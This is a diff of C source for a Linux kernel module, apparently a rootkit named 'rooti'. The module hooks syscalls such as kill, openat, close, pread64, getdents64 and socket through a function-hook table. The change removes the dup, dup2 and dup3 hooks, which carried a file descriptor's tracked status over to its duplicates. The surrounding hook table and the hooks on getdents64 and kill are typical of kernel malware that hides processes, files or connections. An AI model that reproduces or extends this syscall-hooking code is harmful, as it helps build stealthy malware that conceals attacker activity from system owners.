@@ -52,9 +52,6 @@ struct list_head *rooti_tracked_fds_lists[] = {
 static asmlinkage long (*orig_kill)(const struct pt_regs *regs);
 static asmlinkage long (*orig_openat)(const struct pt_regs *regs);
 static asmlinkage long (*orig_close)(const struct pt_regs *regs);
-static asmlinkage long (*orig_dup)(const struct pt_regs *regs);
-static asmlinkage long (*orig_dup2)(const struct pt_regs *regs);
-static asmlinkage long (*orig_dup3)(const struct pt_regs *regs);
 static asmlinkage long (*orig_pread64)(const struct pt_regs *regs);
 static asmlinkage long (*orig_getdents64)(const struct pt_regs *regs);
 static asmlinkage long (*orig_socket)(const struct pt_regs *regs);
@@ -132,48 +129,6 @@ static asmlinkage long hook_close(const struct pt_regs *regs)
         }
     }
     return orig_close(regs);
-}
-
-static asmlinkage long hook_dup(const struct pt_regs *regs)
-{
-    int oldfd = regs->di;
-    int newfd = orig_dup(regs);
-
-    for (int i = 0; i < ARRAY_SIZE(rooti_tracked_fds_lists); i++) {
-        // If the old descriptor is tracked, the new one should also be tracked
-        if (rooti_is_tracked_fd(oldfd, rooti_tracked_fds_lists[i])) {
-            rooti_track_fd(newfd, rooti_tracked_fds_lists[i]);
-        }
-    }
-    return newfd;
-}
-
-static asmlinkage long hook_dup2(const struct pt_regs *regs)
-{
-    int oldfd = regs->di;
-    int newfd = orig_dup2(regs);
-
-    for (int i = 0; i < ARRAY_SIZE(rooti_tracked_fds_lists); i++) {
-        // If the old descriptor is tracked, the new one should also be tracked
-        if (rooti_is_tracked_fd(oldfd, rooti_tracked_fds_lists[i])) {
-            rooti_track_fd(newfd, rooti_tracked_fds_lists[i]);
-        }
-    }
-    return newfd;
-}
-
-static asmlinkage long hook_dup3(const struct pt_regs *regs)
-{
-    int oldfd = regs->di;
-    int newfd = orig_dup3(regs);
-
-    for (int i = 0; i < ARRAY_SIZE(rooti_tracked_fds_lists); i++) {
-        // If the old descriptor is tracked, the new one should also be tracked
-        if (rooti_is_tracked_fd(oldfd, rooti_tracked_fds_lists[i])) {
-            rooti_track_fd(newfd, rooti_tracked_fds_lists[i]);
-        }
-    }
-    return newfd;
 }
 
 static asmlinkage long hook_pread64(const struct pt_regs *regs) {
@@ -323,9 +278,6 @@ struct rooti_func_hook func_hooks[] = {
     ROOTI_FUNC_HOOK(ROOTI_SYSCALL_NAME("sys_kill"), hook_kill, &orig_kill),
     ROOTI_FUNC_HOOK(ROOTI_SYSCALL_NAME("sys_openat"), hook_openat, &orig_openat),
     ROOTI_FUNC_HOOK(ROOTI_SYSCALL_NAME("sys_close"), hook_close, &orig_close),
-    ROOTI_FUNC_HOOK(ROOTI_SYSCALL_NAME("sys_dup"), hook_dup, &orig_dup),
-    ROOTI_FUNC_HOOK(ROOTI_SYSCALL_NAME("sys_dup2"), hook_dup2, &orig_dup2),
-    ROOTI_FUNC_HOOK(ROOTI_SYSCALL_NAME("sys_dup3"), hook_dup3, &orig_dup3),
     ROOTI_FUNC_HOOK(ROOTI_SYSCALL_NAME("sys_pread64"), hook_pread64, &orig_pread64),
     ROOTI_FUNC_HOOK(ROOTI_SYSCALL_NAME("sys_getdents64"), hook_getdents64, &orig_getdents64),
     ROOTI_FUNC_HOOK(ROOTI_SYSCALL_NAME("sys_socket"), hook_socket, &orig_socket),
